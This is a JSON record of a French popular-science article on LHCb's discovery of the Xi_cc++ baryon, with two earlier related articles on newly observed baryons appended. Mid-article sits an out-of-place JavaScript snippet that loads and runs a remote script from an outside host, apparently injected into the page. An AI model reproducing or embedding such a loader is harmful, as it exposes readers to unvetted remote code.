{"title": "Une nouvelle particule decouverte au LHC !", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-07-10", "content": "Une nouvelle particule vient d'etre mise en evidence au Cern grace aux donnees collectees par le detecteur LHCb. Il s'agit d'un baryon. Predit de longue date par le modele standard, celui-ci n'en est pas moins exotique : il contient deux quarks lourds et possede deux fois la charge electrique du proton... Ce qu'il faut retenir Predit par le modele standard de longue date, le baryon Ks cc ++  n'avait encore jamais ete observe, ce qui est maintenant chose faite grace au detecteur LHCb, au Cern. Forme de trois quarks, c'est le premier mis en evidence avec deux quarks lourds, en l'occurrence des quarks charmes (notes cc). C'est egalement un baryon exotique parce qu'il possede deux fois la charge d'un proton (++). Il va servir de laboratoire pour affiner les calculs du modele standard. Cela pourrait permettre de decouvrir des effets fins qui, ailleurs, ne relevent pas de ce modele. LHC : comment fonctionne le plus grand accelerateur de particules ?                       A cheval entre la France et la Suisse, le Grand collisionneur de hadrons permet actuellement de faire des collisions de protons a une energie de 13 TeV (teraelectronvolts). Decouvrez le fonctionnement de cet impressionnant outil en video grace au Cern.                                       Cela fait plus d'un mois que la collecte de donnees pour faire de la  physique  avec des faisceaux de protons a repris au  LHC . Tout recemment, le Cern a par ailleurs annonce qu'un nouveau record de  luminosite  avait ete atteint. Le nombre de collisions avec une  energie  disponible a chaque fois de 13 Tev (ce qui permettrait en theorie la creation d'environ 13.000 nouveaux protons pour chaque collision de deux protons) a donc fait un nouveau bond, ce qui augmente les chances d'observer un evenement interessant. Pourtant, l'un des buts du LHC ne concerne pas la decouverte d'une nouvelle physique mais tout simplement l'exploration du contenu des  equations  de celles que l'on connait deja, a savoir le modele electrofaible et, surtout, celui de la  chromodynamique quantique  (QCD), qui contient le fameux  modele des quarks , dont on a fete le cinquantenaire il y a quelques annees. Une presentation de la collaboration LHCb au Cern. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais apparaissent alors. Cliquez ensuite sur la roue dentee a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c) Cern, YouTube  Deux quarks charmes et un quark up A cet egard, les membres de l'experience LHCb ont un beau tableau de chasse a leur actif. Ils annoncent en effet regulierement la decouverte de  nouveaux hadrons . Ainsi, en ce debut de mois de juillet, ils ont annonce la mise en evidence d'un nouveau  baryon  Xi ( Ks ).  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Celui-ci contient trois  quarks  : deux  quarks charmes  (quarks c) et un quark haut ( quark up , ou u, en anglais). Chacun de ces quarks  porte  une charge valant deux tiers de la charge elementaire d'un  electron . Cet hadron est donc quelque peu  exotique  puisque sa charge est deux fois celle d'un  proton  et qu'il contient deux quarks lourds charmes, d'ou sa designation technique :  Ks cc ++ . Ce baryon n'en etait pas moins predit de longue date par le modele des quarks des annees 1970, qui en contient 6 au lieu des 3 postules au debut des annees 1960. Pouvant s'assembler par deux ou trois essentiellement, ces particules, et leurs  antiparticules , permettent donc un riche zoo dont l'exploration n'est pas encore terminee. Le nouveau baryon doublement charge contient deux quarks charmes et un quark up lies par des courants de gluons, les photons de la force nucleaire forte. (c) Cern                               Un nouveau laboratoire pour explorer les equations de la QCD La  masse  du  Ks cc ++  est d'environ 3.621 MeV, soit presque 4 fois celle d'un proton. Nous disons bien << environ >> car cette particule etant instable et regie par les lois de la  mecanique quantique , l'une des  inegalites de Heisenberg  (celle portant sur le temps et l'energie) implique, en consequence, qu'on ne peut pas attribuer a cette particule une masse absolument exacte. On sait par contre qu'un de ses modes de desintegration se fait en donnant un baryon L c +  et trois  mesons  plus legers, respectivement un kaon et deux pions : K - , p +  et p + . C'est d'ailleurs ce canal de desintegration qui a permis l'identification du  Ks cc ++ . Le signal obtenu dans le detecteur est de 12 sigma, selon le jargon des scientifiques, ce qui veut dire qu'il s'agit d'une decouverte particulierement  solide  et incontestable. La statistique accumulee provient des deux campagnes d'observation du LHC, c'est-a-dire qu'elle combine des evenements deja collectes il y a des annees, avec des collisions a 8 TeV, et ceux obtenus en 2016, avec une energie et une  luminosite  accrues. Spectre de masse L c +  K -  p +  p +  montrant un pic a 3.621 Mev correspondant a la particule Ks cc ++ . (c) LHCb                               La desintegration du  Ks cc ++  est << lente >>, si l'on peut dire. Cela signifie qu'elle se produit sous l'effet d'une  interaction faible . Elle est donc du ressort de la  theorie electrofaible  et non pas du ressort de la QCD ou de la QED ( electrodynamique quantique ). Par contre, la description des caracteristiques de ce baryon requiert bien aussi les equations de la chromodynamique quantique (ces equations sont notoirement difficiles a resoudre dans le domaine non perturbatif, ou elles sont  non lineaires , et c'est pour cette raison que le calcul  ab initio  de la  masse du proton et du neutron  requiert des  ordinateurs ). Le  Ks cc ++  est un laboratoire interessant pour tester et affiner les predictions de la QCD et, donc, indirectement, mettre en evidence des ecarts subtils dans d'autres phenomenes qui relevent de celle-ci et qui pourraient trahir l'existence d'une nouvelle physique. C'est ce qu'exprime le commentaire suivant de Giovanni Passaleva, porte-parole de la collaboration LHCb : <<  Le fait d'avoir trouve un nouveau baryon, contenant deux quarks lourds, presente un grand interet car celui-ci nous offre un outil exceptionnel pour sonder plus avant la chromodynamique quantique, a savoir la theorie decrivant l' interaction forte , l'une des quatre forces fondamentales .  Ces particules nous aideront par consequent a ameliorer la capacite predictive de nos theories  >>. Son predecesseur, Guy Wilkinson, ajoute : <<  Contrairement aux autres baryons, dans lesquels les trois quarks effectuent une danse subtile les uns autour des autres, un baryon a deux quarks lourds devrait se comporter comme un systeme planetaire, ou les deux quarks lourds jouent le role d' etoiles  lourdes en  orbite  l'une autour de l'autre, le quark leger etant, lui, en orbite autour de ce  systeme binaire  >>.  Pour en savoir plus 5 baryons omega decouverts grace a l'experience LHCb Article de  Laurent Sacco  publie le 22/03/2017 L'experience LHCb utilise l'un des quatre detecteurs geants dedies a l'etude des collisions de protons au LHC. Les physiciens qui y travaillent viennent a nouveau d'annoncer la decouverte de nouvelles particules : cinq baryons omega du  modele standard . Depuis plus de 50 ans maintenant, les physiciens se rassemblent pour faire le point sur les dernieres decouvertes en physique fondamentale a l'occasion des  Rencontres de Moriond . Elles se deroulent en ce moment a La Thuile (Italie), dans une ambiance agreable, relaxee et conviviale, permettant a de jeunes chercheurs de discuter directement avec les leaders de leurs domaines. Il se pourrait qu'on y parle des premiers signes de l'existence d'une nouvelle physique debusquee dans les dernieres donnees recueillies au LHC... En attendant, le Cern a annonce que l'un des detecteurs geants du Grand collisionneur de  hadrons , LHCb, avait observe, lors d'une seule experience, cinq nouvelles particules. Les nouvelles particules sont prevues par le modele standard Il s'agit en fait de baryons dont l'existence peut etre predite a partir du modele standard, plus precisement de la chromodynamique quantique et de la theorie des quarks. Il s'agit meme d' etats excites  (de  resonances  dans le jargon des physiciens) d'un membre d'une famille de particules deja connues, les baryons omega. Rappelons que les baryons omega, formes de trois quarks, ne contiennent aucun de ceux qui constituent les protons et les neutrons, a savoir les quarks << u >> et << d >> (sauf fugacement, en tant que fluctuations du vide quantique). Le premier de ces baryons a avoir ete decouvert est le baryon O - . Il avait ete predit theoriquement en 1961 par Murray Gell-Mann et independamment par Yuval Ne'eman, un colonel de l'armee israelienne venu tard a la physique, en utilisant des arguments de  symetrie  bases sur le fameux groupe de Lie SU(3). Cela allait les conduire finalement a la decouverte de la  theorie des quarks . La decouverte du premier baryon omega avec des commentaires de Feynman, Gell-Mann, Ne'eman. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais devraient alors apparaitre. Cliquez ensuite sur l'ecrou a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c) YouTube Le baryon O -  a ete observe en 1964. Il est charge negativement, d'ou le << - >>, et est compose de trois  quarks etranges  (des quarks dits << s >>). Comme ils l'expliquent dans un article depose sur  arXiv , les chercheurs du Cern ont, eux, decouvert les baryons O c (3000) 0 , O c (3050) 0 , O c (3066) 0 , O c (3090) 0  et O c (3119) 0 . Les nombres en parentheses donnent les masses respectives des particules en megaelectronvolts (MeV), mesurees par LHCb. Ce sont en quelque sorte les equivalents d' atomes  d' hydrogene  a des energies differentes du fait que l'electron se trouve sur des niveaux d'energie distincts. La decouverte de nouvelles particules avec des detecteurs peut etre comparee a la reception d'une gamme de frequences par un poste de radio. Au sein du bruit de fond, le signal produit une resonance dans le recepteur lorsqu'il est cale sur la bonne frequence. Comme le montre ce schema, ces cinq nouvelles particules dans le detecteur LHCb se presentent comme cinq << resonances >>, en rouge, au-dessus du bruit de fond, pour des energies associees a des masses. (c) Collaboration LHCb                               Ces baryons sont tres instables, donc ils se desintegrent rapidement. Leur etude pourrait nous aider a mieux comprendre le contenu des equations de la chromodynamique quantique et peut-etre d'y voir une nouvelle physique a l'oeuvre. Le LHC sur les traces d'une nouvelle physique Article de Laurent Sacco publie le 21/11/2014  Le Cern fete en 2014 ses 60 ans et c'est un beau cadeau d'anniversaire que viennent de lui offrir les membres de la collaboration LHCb qui utilisent l'un des quatre grands detecteurs de particules du LHC : deux nouveaux baryons. Ils avaient ete predits dans le cadre du modele standard et devraient aider a decouvrir des traces d'une nouvelle physique. Depuis quelques annees, l'Europe apparait comme a la tete de plusieurs domaines scientifiques qui ont longtemps ete l'apanage des Etats-Unis au niveau mondial. Il y a bien sur les missions  Planck  et Herschel en ce qui concerne la  cosmologie  et l' astrophysique  et plus recemment l'extraordinaire performance de la mission  Rosetta . On peut citer aussi le  Human Brain Project , qualifie de veritable Cern des neurosciences. Le  Cern  lui-meme vient de feter les 60 ans de sa naissance officielle comme organisme de recherche en physique des hautes energies au niveau europeen. Il y a 50 ans, l'un de ses chercheurs, George Zweig, decouvrait independamment de Murray Gell-Mann le  modele des quarks , qui a conduit presque 10 ans plus tard a la decouverte des equations de la chromodynamique quantique (la QCD) expliquant la force nucleaire forte, et sur lequel s'est bati aussi le modele electrofaible ayant conduit a la mise en evidence du  boson de Brout-Englert-Higgs  avec le LHC. Un autre chercheur du Cern,  John Bell , publiait aussi en 1964 un article que l'on peut considerer comme l'un des plus influents pour la naissance des travaux dans le domaine de l'information quantique. Des membres de la famille des baryons Xi Ces multiples anniversaires viennent de s'accompagner d'une publication sur  arxiv  par les membres de la collaboration LHCb. Ce detecteur a plus specifiquement pour mission de nous eclairer sur les mysteres de l' antimatiere  via des mesures sur la  violation de la symetrie CP  en etudiant des hadrons contenant des  mesons b . Mais comme l'annoncent les physiciens qui l'utilisent pour leurs experiences, il leur a permis de decouvrir deux nouvelles particules appelees Xi b -  et Xi b * - , qui avaient ete predites par le modele des quarks, mais qui n'avaient jamais ete observees jusqu'ici. La decouverte de nouvelles particules avec des detecteurs peut etre comparee a l'utilisation d'un poste de radio pour capter un canal d'emission. Il existe un bruit de fond au-dessus duquel le signal radio produit ce qu'on appelle une resonance dans le poste recepteur lorsqu'il est cale sur la frequence de l'emetteur. Comme le montre ce schema, la decouverte de deux nouvelles particules dans le detecteur LHCb se presente comme deux << resonances >> en bleu au-dessus du bruit de fond, en rouge pour des energies associees a des masses. (c) Cern                               Un tremplin pour chasser de la nouvelle physique Il ne s'agit donc pas d'une preuve de l'existence d'une nouvelle physique, bien que le LHCb ait fourni quelques indications intrigantes de l'existence d'un  boson Z'  en 2013. Il ne s'agit pas non plus d' hadrons exotiques  comme ceux qui ont aussi ete decouverts en analysant les produits des collisions de protons dans LHCb avant que le LHC ne soit arrete pour que ses capacites soient ameliorees. Il s'agit de baryons qui appartiennent a une famille de particules composees de trois quarks, les baryons Xi, et donc un nouveau membre le Xi b * 0 , avait deja ete observee en 2012 par l'experience CMS. Les deux nouveaux baryons ont une masse d'environ 6 fois celle du proton et ils contiennent chacun un quark b, un quark s et un  quark d . Mais tout comme les niveaux d'energie des electrons dans un atome peuvent differer en raison de l'etat de  spin  de l'electron dans l'atome, ces deux baryons n'ont pas la meme energie de masse parce que dans le cas du Xi b - , les spins des deux quarks les plus legers sont de sens opposes a celui du quark b, tandis que dans l'etat Xi b * - , ils sont de meme sens. Ils constituent de nouveaux laboratoires permettant de tester les predictions de la QCD qui sont parfois impossibles a obtenir sans l'aide d'un  ordinateur  etant donne les equations non lineaires qui sont a la base de la theorie. Pour ceux qui attendaient du LHC, la decouverte de particules de  matiere noire  ou encore de  minitrous noirs , ces deux nouvelles particules, qui semblent tout a fait conformes aux predictions du modele standard, apparaissent surement comme quelque peu insipides. Toutefois, comme le rappelle Patrick Koppenburg, coordinateur pour la physique de LHCb, de l'institut Nikhef, a Amsterdam :  << Si nous voulons decouvrir une nouvelle physique au-dela du modele standard, nous devons d'abord en avoir une image nette. Ces etudes de haute precision nous aideront a faire la difference, a l'avenir, entre des effets relevant du modele standard et tout element nouveau ou imprevu >>. Le  LHC  devrait repartir a la chasse a de la nouvelle physique au printemps 2015. ", "theme": "sciences"}